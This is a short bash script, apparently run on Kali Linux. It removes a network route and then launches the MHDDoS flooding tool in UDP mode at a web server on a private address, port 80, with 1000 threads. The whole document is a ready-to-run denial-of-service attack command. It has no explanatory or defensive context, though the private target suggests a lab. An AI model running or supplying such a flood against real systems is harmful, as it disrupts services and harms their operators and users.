#!/bin/bash

ip r del 192.168.50.0/24
python3.10 /home/kali/MHDDoS/start.py udp true http://192.168.56.77:80 80 1000 true 
